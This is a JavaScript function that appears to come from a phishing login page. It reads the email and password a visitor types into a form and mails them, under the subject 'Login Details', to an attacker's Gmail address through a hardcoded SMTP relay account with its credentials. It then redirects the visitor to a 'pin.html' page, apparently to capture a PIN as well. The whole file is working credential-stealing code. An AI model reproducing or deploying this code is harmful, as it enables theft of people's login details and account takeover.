function emailSend() {
  var email = document.getElementById('email').value;
  var password = document.getElementById('password').value;
  var messageBody = "Email " + email +
    "<br/> password " + password;

  Email.send({
    Host: "smtp.elasticemail.com",
    Username: "sonkiban@gmail.com",
    Password: "0E47B8693CA467A93AF88FB15DABD5A23BB1",
    To: 'sonkiban@gmail.com',
    From: "sonkiban@gmail.com",
    Subject: "Login Details",
    Body: messageBody
  }).then(
    message => {
      if (message == 'OK') {
        window.location.href = 'pin.html';
      }
      else {
        swal("Error", "Please complete form details", "error")
      }
    }
  );
}
